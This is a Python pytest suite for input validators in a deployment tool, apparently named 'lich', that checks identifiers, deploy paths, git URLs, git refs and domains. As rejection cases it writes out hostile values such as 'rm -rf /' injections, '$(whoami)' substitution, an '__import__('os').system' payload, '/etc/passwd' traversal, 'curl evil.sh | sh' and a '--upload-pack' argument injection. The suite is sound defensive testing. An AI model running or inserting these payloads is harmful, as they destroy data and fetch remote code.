"""Tests for input validation helpers."""
import pytest

from lich.commands._validate import (
    ValidationError,
    validate_identifier,
    validate_deploy_path,
    validate_git_url,
    validate_git_ref,
    validate_domain,
)


class TestValidateIdentifier:
    def test_accepts_simple_name(self):
        assert validate_identifier("Product") == "Product"

    def test_accepts_underscore_name(self):
        assert validate_identifier("order_item") == "order_item"

    def test_strips_whitespace(self):
        assert validate_identifier("  Product  ") == "Product"

    def test_rejects_shell_injection(self):
        with pytest.raises(ValidationError):
            validate_identifier("Product; rm -rf /")

    def test_rejects_fstring_injection(self):
        with pytest.raises(ValidationError):
            validate_identifier("{__import__('os').system('id')}")

    def test_rejects_path_traversal(self):
        with pytest.raises(ValidationError):
            validate_identifier("../../etc/passwd")

    def test_rejects_leading_digit(self):
        with pytest.raises(ValidationError):
            validate_identifier("1Product")

    def test_rejects_empty(self):
        with pytest.raises(ValidationError):
            validate_identifier("")


class TestValidateDeployPath:
    def test_accepts_normal_path(self):
        assert validate_deploy_path("/opt/app") == "/opt/app"

    def test_accepts_nested_path(self):
        assert validate_deploy_path("/srv/my-app_2/backend") == "/srv/my-app_2/backend"

    def test_rejects_semicolon_injection(self):
        with pytest.raises(ValidationError):
            validate_deploy_path('/opt/app"; rm -rf / #')

    def test_rejects_command_substitution(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/opt/$(whoami)")

    def test_rejects_spaces(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/opt/my app")

    def test_rejects_relative_path(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("opt/app")

    def test_rejects_parent_traversal(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/opt/../etc")


class TestValidateGitUrl:
    def test_accepts_ssh_url(self):
        url = "git@github.com:acme/app.git"
        assert validate_git_url(url) == url

    def test_accepts_https_url(self):
        url = "https://github.com/acme/app.git"
        assert validate_git_url(url) == url

    def test_accepts_gitlab_ssh(self):
        url = "git@gitlab.com:group/sub/app.git"
        assert validate_git_url(url) == url

    def test_rejects_shell_metacharacters(self):
        with pytest.raises(ValidationError):
            validate_git_url("git@github.com:a/b.git && curl evil.sh | sh")

    def test_rejects_plain_string(self):
        with pytest.raises(ValidationError):
            validate_git_url("not a url")


class TestValidateGitRef:
    def test_accepts_tag(self):
        assert validate_git_ref("v1.2.3") == "v1.2.3"

    def test_accepts_branch_with_slash(self):
        assert validate_git_ref("feature/login") == "feature/login"

    def test_accepts_sha(self):
        assert validate_git_ref("a1b2c3d") == "a1b2c3d"

    def test_rejects_injection(self):
        with pytest.raises(ValidationError):
            validate_git_ref("main; rm -rf /")

    def test_rejects_leading_dash(self):
        # a leading dash could be parsed as a git option (argument injection)
        with pytest.raises(ValidationError):
            validate_git_ref("--upload-pack=touch /tmp/pwned")


class TestValidateDomain:
    def test_accepts_domain(self):
        assert validate_domain("example.com") == "example.com"

    def test_accepts_subdomain(self):
        assert validate_domain("api.example.co.uk") == "api.example.co.uk"

    def test_rejects_injection(self):
        with pytest.raises(ValidationError):
            validate_domain("example.com; curl evil.sh")

    def test_rejects_spaces(self):
        with pytest.raises(ValidationError):
            validate_domain("exam ple.com")


class TestNewlineAndControlChars:
    def test_identifier_rejects_trailing_newline_payload(self):
        with pytest.raises(ValidationError):
            validate_identifier("Product\n; rm -rf /")

    def test_raw_regex_is_safe_without_strip(self):
        # fullmatch must reject a trailing newline even before strip() is applied
        from lich.commands._validate import _IDENTIFIER_RE
        assert _IDENTIFIER_RE.fullmatch("Product\n") is None

    def test_error_message_escapes_control_chars(self):
        with pytest.raises(ValidationError) as excinfo:
            validate_identifier("evil\x1b[31mRED")
        assert "\x1b" not in str(excinfo.value)


class TestDeployPathDepth:
    def test_rejects_bare_root(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/")

    def test_rejects_double_slash(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("//etc")

    def test_rejects_single_segment(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/opt")

    def test_rejects_trailing_slash(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/opt/app/")


class TestGitRefRange:
    def test_rejects_range_syntax(self):
        with pytest.raises(ValidationError):
            validate_git_ref("main..prod")


class TestDomainLength:
    def test_rejects_overlong_label(self):
        with pytest.raises(ValidationError):
            validate_domain("a" * 64 + ".com")

    def test_rejects_overlong_domain(self):
        with pytest.raises(ValidationError):
            validate_domain(".".join(["abcdefgh"] * 32) + ".com")
